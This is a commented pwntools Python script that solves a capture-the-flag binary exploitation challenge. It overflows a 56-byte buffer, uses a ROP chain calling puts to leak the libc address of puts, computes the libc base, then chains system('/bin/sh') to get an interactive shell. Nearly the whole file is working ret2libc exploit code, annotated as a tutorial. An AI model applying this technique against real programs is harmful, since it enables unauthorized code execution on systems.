#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'amd64'	#this tells pwntools, hey this is what we are up against. so when we use the magic of pwntools it'll know the appropriate options to take
elf = ELF('./pb')	#this loads the challenge file as an ELF object in python to be ran as a process 
offset = 56		#this is found by running the process and entering a padding and checking if it fills up the buffer and using dmesg to confirm. gdb-peda can also find us the buffer automagically
p = elf.process()	#creates a process object to enable us to walkthrough the binary as it is running
libc = ELF('./glibc/libc.so.6')		#creates an ELF object for the libc library provided

#ROP magic allows us to get a memory leak from runtime. puts, printf, gets are vulnerable functions to help us to do this. This allows us to pass arguments into the registers to help us call different functions within the binary and it's dynamically linked libraries
rop = ROP(elf)		#creates a ROP object from the elf object (challenge file)
rop.call(elf.symbols["puts"], [elf.got['puts']])	#creates a ROP chain starting with the puts() function that is loaded into memory for runtime in that binary and passes the libc puts function as an argument indicate we want to find the memory address of libc's puts function
rop.call(elf.symbols["box"])	#you end with a call to send the register back to box

#payload = (b'A' * offset) + p64(elf.symbols['box'])	#running this as our payload shows us that we can control the memory space and go anywhere we want
payload = (b'A' * offset) + rop.chain()		#this payload adds the overflow of A*offset and includes the memory addresses given to us in the rop.call calls above

#you want to move through the process (executing the binary) until you get to the spot where the injectable input is
p.recvuntil(b">>")	#starts the challenge process and moves to the first input required 
p.sendline(b'2')	#sends input to the process to move to through the process
p.recvuntil(b"library:")	#runs the process until the injectable input
p.sendline(payload)	#sends the payload causing seg fault. if we see "stopped with exit code -11 (SIGSEGV)"
p.recvline()	#receives the next three lines that are outputted after sending in the input
p.recvline()
p.recvline()	

puts = u64(p.recvline().rstrip().ljust(8, b'\x00'))	#your overflow returns the libc puts address. you want this because during a remote pwn challenge you won't have access to that machine and won't know where the puts address is going to be

#in other CTFs you will have to figure out what version of libc is being used and get a copy on your local machine
#but in this one you're provided the libc file and version. 
#A local copy allows you allows you to find how much 'data' from the beginning of the libc file until you get to where you want
#For example if you're looking for where the puts() function is within libc; lets just say it's on line 50
#Because the way dynamic linked libaries work, the entire file is loaded into memory when the binary that uses that library is ran
#You know that lines 1 - 49 uses X amount of memory when it is loaded
#When you find the memory address space of the running binary for the puts function you can diff X amount and you will have where your libc starts in memory of the running binary 
libc.address = puts - libc.symbols["puts"]	#diffs the running puts from the local libc puts

rop = ROP(libc)		#creates a rop in the context of the libc file because we will want to ROP through the libc in memory to run our system(/bin/sh)
rop.call(libc.symbols['puts'], [ next(libc.search(b"/bin/sh\x00")) ])		#starts a chain of rop.calls to puts to pass /bin/sh as an argument so that when you run the exploit /bin/sh is displayed. You can remove the second argument but you can't remove the whole line.
rop.call(libc.symbols["system"], [ next(libc.search(b"/bin/sh\x00")) ])		#finds the system call and passes /bin/sh as an argument

p.recvuntil(b">>")	#starts to move through the process again
p.sendline(b'2')
p.recvuntil(b"library:")
payload = (b'A' * offset) + rop.chain()
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()

p.interactive()
